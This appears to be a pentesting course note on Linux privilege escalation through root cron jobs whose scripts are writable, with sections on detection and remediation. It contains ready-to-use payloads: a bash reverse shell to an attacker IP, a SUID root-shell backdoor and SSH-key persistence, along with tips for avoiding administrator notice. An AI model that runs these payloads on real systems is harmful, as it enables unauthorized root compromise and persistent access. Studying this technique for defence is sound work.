---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.09 Cron Job Abuse Scripts"
---

# Cron Job Abuse: Writable Scripts

## Executive Summary

Cron is a time-based job scheduler in Unix-like operating systems. System administrators use cron to schedule jobs (commands or shell scripts) to run periodically at fixed times, dates, or intervals. These jobs are often run with high privileges, such as the `root` user, to perform administrative tasks like backups, log rotation, and system monitoring. Privilege escalation occurs when a cron job executing as `root` invokes a script or binary that is writable by an unprivileged user. By modifying the contents of the writable script, an attacker can inject arbitrary commands. When the cron daemon executes the scheduled task, the attacker's injected commands are executed with the privileges of the cron job's owner (usually `root`), resulting in a complete system compromise.

## Understanding Cron Jobs

Cron relies on configuration files known as `crontabs` to define what commands to run and when to run them.

### Types of Crontabs

1.  **System-Wide Crontabs**:
    *   `/etc/crontab`: The primary system crontab file. It includes an extra field specifying the user account the job should run as.
    *   `/etc/cron.d/`: A directory containing individual files that use the same format as `/etc/crontab`.
    *   `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, `/etc/cron.monthly/`: Directories containing executable scripts that are run at the specified intervals by `run-parts`.

2.  **User Crontabs**:
    *   Stored typically in `/var/spool/cron/crontabs/` or `/var/spool/cron/`.
    *   Managed using the `crontab -e` command.
    *   These jobs run as the user who created them.

### Crontab Format

The standard cron format consists of five time-and-date fields followed by the command:
`* * * * * command_to_execute`
(Minute) (Hour) (Day of Month) (Month) (Day of Week)

In system crontabs (`/etc/crontab` and `/etc/cron.d/*`), a user field is added:
`* * * * * root /usr/local/bin/backup.sh`

## The Vulnerability: Writable Scripts

The core vulnerability is a misconfiguration in file permissions. If a script (e.g., `/usr/local/bin/backup.sh`) is scheduled to run as root, but the file itself has permissions that allow an unprivileged user to edit it (e.g., `0777`, or owned by a group the attacker is in with `0775`), the attacker can append their own malicious payloads to the file.

Furthermore, if the directory containing the script is writable, an attacker might be able to delete the original script and replace it with their own malicious file, even if they don't have write access to the script itself.

## Attack Flow Architecture

```ascii
+-----------------------+
|  Unprivileged Shell   |
|  (Attacker Access)    |
+-----------+-----------+
            |
            | 1. Discovers Cron Job
            v
+-----------------------+        2. Injects Payload         +-------------------+
| Scheduled Script      | --------------------------------> |  Malicious Script |
| /usr/local/bin/backup |                                   |  (Reverse Shell)  |
| Permissions: 0777     | <-------------------------------- |                   |
+-----------+-----------+        3. Modified Script         +-------------------+
            |
            | 4. Waits for execution time
            v
+-----------------------+
|      Cron Daemon      |
|      (Runs as root)   |
+-----------+-----------+
            |
            | 5. Executes /usr/local/bin/backup.sh
            v
+-----------------------+        6. Payload executes        +-------------------+
|      Root Shell       | --------------------------------> |  Attacker Listener|
|      (uid=0)          |                                   |  (Netcat)         |
+-----------------------+                                   +-------------------+
```

## Exploitation Phase

Exploiting a writable cron job script requires enumerating the system to find the vulnerability, crafting a suitable payload, and waiting for the job to execute.

### Step 1: Enumeration and Discovery

The first step is identifying active cron jobs and examining their permissions.

1.  **Check System Crontabs:**
    ```bash
    cat /etc/crontab
    ls -lah /etc/cron.d/
    ls -lah /etc/cron.hourly/
    ls -lah /etc/cron.daily/
    ```

2.  **Identify Writable Files:**
    Once scripts are identified, check if they are writable.
    ```bash
    ls -lah /usr/local/bin/backup.sh
    # Output indicating vulnerability:
    # -rwxrwxrwx 1 root root 1.2K Jan 01 12:00 /usr/local/bin/backup.sh
    ```

3.  **Using automated tools or pspy:**
    Sometimes cron jobs are not explicitly listed in readable files (e.g., another user's crontab). Tools like `pspy` can monitor running processes without root privileges, allowing you to observe cron jobs executing in real-time.
    ```bash
    ./pspy64 -pf -i 1000
    # Watch for processes running on exactly the minute mark (e.g., 12:01:00, 12:02:00).
    ```

### Step 2: Crafting the Payload

Once a writable script executed by root is identified, you must append a malicious payload. Do not overwrite the entire script unless necessary, as breaking the original functionality might alert administrators.

#### Payload 1: Reverse Shell

The most common payload is a bash reverse shell.

1.  Set up a listener on your attacker machine:
    ```bash
    nc -lvnp 4444
    ```

2.  Append the reverse shell to the writable script:
    ```bash
    echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> /usr/local/bin/backup.sh
    ```

#### Payload 2: SUID Binary Creation

If a reverse shell is not possible (e.g., due to firewall restrictions), you can configure the script to copy `/bin/bash` and set the SUID bit, creating a local backdoor.

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /usr/local/bin/backup.sh
```

After the cron job runs, you can execute `/tmp/rootbash -p` to gain a root shell.

#### Payload 3: Adding an SSH Key

You can add your public SSH key to the root user's `authorized_keys` file for persistent access.

```bash
echo 'echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys' >> /usr/local/bin/backup.sh
```

### Step 3: Execution and Privilege Escalation

After injecting the payload, the final step is simply waiting. Cron jobs run on a strict schedule. If the job runs every minute (`* * * * *`), the shell will trigger almost immediately. If it runs daily, the wait will be significantly longer.

## Edge Cases & Troubleshooting

### Script Reset / Overwrite
Sometimes, the vulnerable script is generated or restored by another process before the cron job executes, wiping out the injected payload.
**Solution:** You may need to create a continuous loop that constantly injects the payload just before the cron execution.

### Partial Execution or Syntax Errors
If you inject a payload with invalid syntax, the bash interpreter will throw an error, and the cron job will fail, potentially logging the error and alerting admins.
**Solution:** Always test payloads locally. Use `echo` carefully and consider appending `|| true` to your payload to ensure the script continues even if your command fails.

### Environmental Variables
Cron jobs run in a very restricted environment. Variables like `$PATH` are often limited (e.g., `/usr/bin:/bin`).
**Solution:** Always use absolute paths for commands in your payload (e.g., `/bin/bash` instead of `bash`, `/bin/nc` instead of `nc`).

## Detection and Forensics

1.  **File Integrity Monitoring (FIM):** Tools like OSSEC should be configured to monitor all scripts scheduled via cron. Any modification should generate a high-priority alert.
2.  **Cron Logging:** By default, cron logs its executions to `/var/log/syslog` or `/var/log/cron.log`. However, it does not log the *output* of the scripts unless explicitly configured. Monitoring process execution (via auditd or eBPF) linked to the cron parent process can reveal unexpected child processes like reverse shells.
3.  **Auditing Script Permissions:** Regularly run security auditing tools (like LinPEAS) or custom bash scripts to find world-writable files in the system path or those referenced in `/etc/crontab`.

## Remediation

1.  **Strict Permissions:** Ensure all scripts executed by cron as root are owned by root and have strict permissions (`0755` or `0700`).
    ```bash
    sudo chown root:root /usr/local/bin/backup.sh
    sudo chmod 755 /usr/local/bin/backup.sh
    ```
2.  **Secure Directories:** Ensure the directories containing these scripts are also not world-writable to prevent file replacement attacks.
3.  **Principle of Least Privilege:** Does the cron job actually need to run as root? If the backup script only backs up `/var/www`, it should run as a dedicated backup user or the `www-data` user, not root.

## Chaining Opportunities

*   **[[10 - Cron Job Abuse PATH Hijacking]]**: If the script is not writable, but it calls binaries using relative paths (e.g., `tar` instead of `/bin/tar`), you might be able to abuse the cron job's `PATH` variable.
*   **[[05 - Wildcard Injection]]**: If the cron script uses wildcards in its commands (e.g., `rm -rf /var/backups/*`), it can be exploited via wildcard injection techniques.

## Related Notes
*   [[01 - Linux Privilege Escalation Fundamentals]]
*   [[10 - Cron Job Abuse PATH Hijacking]]
*   [[05 - Wildcard Injection]]
*   [[15 - Abusing Scheduled Tasks]]
